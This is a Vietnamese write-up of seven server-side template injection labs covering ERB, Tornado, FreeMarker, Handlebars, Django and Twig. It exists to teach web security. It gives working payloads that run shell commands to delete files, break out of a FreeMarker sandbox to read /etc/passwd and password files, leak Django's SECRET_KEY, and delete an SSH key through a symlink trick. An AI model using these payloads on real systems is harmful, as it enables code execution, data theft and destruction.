# Nguyễn Văn Thọ - Server Side Template Injection

### Bài 1: Basic server-side template injection

>![](https://i.imgur.com/VZiNTXR.png)

Bài lab chứa lỗ hổng SSTI với template engine là ERB. Tìm cách khai thác và xóa file `morale.txt`

Kiểm tra chức năng `View details` của sản phầm đầu tiên ta thấy trả về message như sau:

>![](https://i.imgur.com/u6Sk4xM.png)

Và lúc này tham số của URL có thêm đoạn như sau:

>![](https://i.imgur.com/viLbIvJ.png)

Thử các payload để detect lỗ hổng SSTI, ta thấy payload sau thực thi được.

`<%= 7 * 7 %>` //Kết quả xuất hiện `49` trên màn hình

Thử tiếp payload 

```
<%= 7 / 0 %>
```

Ta có kết quả error hiện ra, trong đó có đề cập tới template mà trang web sử dụng.

>![](https://i.imgur.com/XTgeDma.png)


Cuối cùng tìm kiếm payload thực thi System code với template này, ta có

Payload:
```
<%=%20system("rm%20/home/carlos/morale.txt")%20%>
```

Kết quả:

>![](https://i.imgur.com/MzpTHWw.png)

<hr>

### Bài 2: Basic server-side template injection (code context)

>![](https://i.imgur.com/gZ5F1AB.png)


Sau khi đăng nhập ta thấy trang web có thêm chức năng `Prefer name`

>![](https://i.imgur.com/7WuXACE.png)

Kiểm tra source của chức năng ta thấy giá trị của các options như sau:

>![](https://i.imgur.com/3t5TXhS.png)

Đoán rằng giá trị này sẽ được đẩy vào template để hiện ra.


Khi thay đổi value của trường này thì tên của ta khi comment sẽ hiện khác nhau, ví dụ như sau:

>![](https://i.imgur.com/UBCZhOB.png)

>![](https://i.imgur.com/g44QjSE.png)

Vì data được nhúng vào giữa payload nên ta chỉ cần thử `7/0` để trigger error thì có được tên của template engine

>![](https://i.imgur.com/qw8vmRc.png)

Tìm payload RCE cho template này ta có 

```
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

Kết quả:

>![](https://i.imgur.com/YMnQL9e.png)


<hr>

### Bài 3: Server-side template injection using documentation

>![](https://i.imgur.com/aSCedHE.png)

Dùng chức năng `Edit template` ta thấy có các vị trí template nhận data từ backend, sửa nó với giá trị ` ${7/0}` ta nhận diện được template engine mà nó sử dụng.

>![](https://i.imgur.com/xyLAwDF.png)

Payload:

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

Kết quả:

>![](https://i.imgur.com/pIVLprf.png)

<hr>

### Bài 4: Server-side template injection in an unknown language with a documented exploit

>![](https://i.imgur.com/5maenl6.png)

Khi click `View detail` của bài post thứ nhất ta thấy có message hiện lên như bài lab phía trên. Thử thay giá trị tham số `message` với `{{7/0}}`thì ta có error hiện ra cho biết server đang sử dụng HandleBarJs.

>![](https://i.imgur.com/qp8YrbQ.png)

Tìm kiếm trên book.hacktrick, ta thấy có payload thực thi RCE đối với lỗ hổng SSTI của template engine này.

Payload:

>![](https://i.imgur.com/H1scd7o.png)

Encode chuỗi trên và thay command lại, ta solve được bài lab.

Kết quả:

>![](https://i.imgur.com/dcKphdk.png)


<hr>

### Bài 5: Server-side template injection with information disclosure via user-supplied objects

>![](https://i.imgur.com/LhL6bnz.png)

Thử trigger lỗi chức năng `Edit template` ta thấy có lỗi như sau, cho biết template của framework Django đang được sử dụng

>![](https://i.imgur.com/VHfNad7.png)

Thử tìm kiếm cách để lấy secret key, ta có.

> ![](https://i.imgur.com/UegyxnP.png)

Vậy là nó sẽ nằm trong file `settings.py`

Thử dùng payload `{% debug %}` để kiểm tra các đối tượng ta có thể truy cập từ template, chú ý rằng ta có thể truy cập tới `settings`.

Dựa vào hướng dẫn sau

>![](https://i.imgur.com/6PjQqOV.png)

Ta dựng được payload để đọc thuộc tính `SECRET_KEY` của đối tượng `settings`

```
{{ settings.SECRET_KEY }}
```

Kết quả:

>![](https://i.imgur.com/a246aQF.png)

<hr>

### Bài 6: Server-side template injection in a sandboxed environment

>![](https://i.imgur.com/uhNpDlW.png)

Bài lab sử dụng `Freemaker` template nhưng bị SSTI do triển khai sandbox chưa họp lý, tìm cách break ra khỏi sandbox và xóa file trên hệ thống `my_password.txt`

Dùng chức năng `Edit template` như các bài trên, ta thấy không áp dụng các payload SSTI built sẵn được.

Có thể kiểm soát được đối tượng `Product`, thuộc lớp `FreeMarkerProduct`

>![](https://i.imgur.com/GGDji9F.png)

Kiểm tra protectionDomain thấy ta có quyền đọc

>![](https://i.imgur.com/IM70Tc7.png)

Sâu hơn ta có thể lấy Path của file và dùng resolve để chuyển đến đường dẫn ta mong muốn.

Lấy path của file jar.

```
class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()
```

>![](https://i.imgur.com/Uw9krMd.png)

Chuyển path thành đường dẫn khác với `resolve()`

```
${product.class.getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd')}
```

>![](https://i.imgur.com/5ILFQdV.png)

Dùng readAllBytes() để đọc file này

```!
.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")

```

>![](https://i.imgur.com/Di78BNN.png)

Kết quả đọc file `/home/carlos/my_password.txt`

>![](https://i.imgur.com/esfu8bU.png)


>![](https://i.imgur.com/oTLhrkO.png)


<hr>

### Bài 7: Server-side template injection with a custom exploit

>![](https://i.imgur.com/PIZIOYF.png)

Ở bài này, sau khi đăng nhập ta lại thấy chức năng `Preferred name` như bài lab phía trên.

>![](https://i.imgur.com/Pc2ECLl.png)

Trigger error, ta thấy trang web  sử dụng template `Twig`

>![](https://i.imgur.com/IQ6V0DD.png)

Upload 1 avatar không phải là ảnh, ta thấy có lỗi trả về như sau:

>![](https://i.imgur.com/pikqGGo.png)

Vậy là đối tượng `user` có method `setAvatart()`, thử đổi giá trị preferred name thành method() này, cùng với 2 tham số, ta có thể đọc *Method này nhận 2 tham số là tên file và data type*

```
user.setAvatar('/etc/passwd','image/png')
```

Truy cập tới file avatar, `/avatar?avatar=wiener`, nó trả về 1 file như sau. Vậy xác nhận ta có thể đọc 1 file bất kỳ.


>![](https://i.imgur.com/cjqLJQi.png)


Để xóa file, ta thử đọc source code của các file khác trên server.

```php!
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Nhận thấy có function `gdprDelete` là public function cho phép xóa file, ta tạo payload như sau:

```
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

Sau đó submit

```
user.gdprDelete()
```

Kết quả:

>![](https://i.imgur.com/058GIGm.png)


<hr>


